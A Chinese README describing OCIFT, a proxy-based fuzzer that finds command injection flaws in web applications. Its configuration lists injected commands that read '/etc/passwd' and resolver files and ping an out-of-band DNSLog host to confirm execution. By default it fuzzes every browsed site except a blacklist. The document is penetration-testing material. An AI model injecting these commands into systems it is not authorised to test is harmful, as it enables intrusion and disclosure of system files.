# OCIFT
一个半自动化命令注入漏洞Fuzz工具(One Semi-automation command injection vulnerability Fuzz tool)

## 1. OCIFT是什么

一个半自动化命令注入漏洞Fuzz工具(One Semi-automation command injection vulnerability Fuzz tool)简写为:OCIFT

## 2. OCIFT有什么用

这是一种半自动化的黑盒测试工具,它可以帮助渗透测试人员或代码审计人员在愉快的上网的同时，深度挖掘目标应用系统存在的命令注入漏洞。 

## 3. OCIFT有什么特点

*   Payload基于Commix生成方式修改而来(需要持续完善).
*   基于浏览器代理的半自动化Fuzz.
*   多线程Fuzz速度快,不影响正常浏览器访问使用.
*   支持设置白名单限制Fuzz范围.
*   支持设置黑名单避免带来不必要的麻烦.
*   支持DNSLog辅助验证

## 4. OCIFT实现思路

基于Tornado的实现一个代理服务器，解析GET／POST请求提取Fuzz点，带入payload进行Fuzz测试。

*   文件结构说明

`
*
|____run.py       主程序入口
|____dnslog.py    DNSLog SDK
|____fuzz.conf    配置文件
|____fuzz.py      Fuzz线程
|____make_payload.py  Payload生成器
|____readme.md  说明文档`

## 5. 配置文件说明

*   配置各个参数,以逗号分隔

`[initconfig]`

*   黑名单HOST－为了避免带来不必要的麻烦

`black_hosts =.gov,localhost,127.0.0.1,google,gstatic,cnzz.com,doubleclick,police,mil.cn,gov.cn,gov.com`

*   静态文件黑名单-这些不做Fuzz

`url_ext_black =.ico,.flv,.css,.jpg,.png,.jpeg,.gif,.pdf,.ss3,.txt,.rar,.zip,.avi,.mp4,.swf,.wmi,.exe,.mpeg`

*   白名单HOST-为了限制Fuzz的范围, 默认为空-表示对除黑名单范围外的所有地址进行Fuzz.

`white_site =qunar`

*   请求超时-限制每次Fuzz请求超时时间

`timeout =10`

*   我的DnsLog地址

`my_cloudeye =ano1qu2j.xfkxfk.com`

*   判断是够注入命令执行成功的关键字

`checkkeys =110586256,/bin/bash,nameserver,IPv4,Windows IP`

*   用于测试命令注入的基本命令

`base_command =cat /etc/resolv.conf,echo 110586256,cat /etc/passwd,ipconfig,ping CommandInj.{my_cloudeye},echo 110586256<nul`

*   Fuzz线程数

`fuzz_count =20`

*   fuzz的payload类型, 默认False-表示使用自定义的规则

`commix_payload_type = False`

*   DnsLog登录会话ID,我用的xfkxfk牛的dnslog.xfkxfk.com

`dnslog_sessionid =q6wva2e3skg79vkdegra2bygft0d1`

*   Your Domain

`custom_domain =a2fta2j`

*   记录成功结果的Log文件

`Logfile =rce_success_results.txt`

## 6.如何使用

*   1.安装模块

`pip install tornado
pip install requests`

*   2.根据自己需要完成文件fuzz.conf的配置
*   3.启用主程序

`python run.py 8089`
如下图:

![启动](http://www.coffeehb.cn/zb_users/upload/2017/04/20170409003441149166928169694.jpg)

*   4.设置浏览器代理
然后会自动开始Fuzz

![开始Fuzz](http://www.coffeehb.cn/zb_users/upload/2017/04/20170409003324149166920421927.jpg)

## 7.总结

*   基本实现了想要的半自动化Fuzz功能
*   payload还需要不断优化

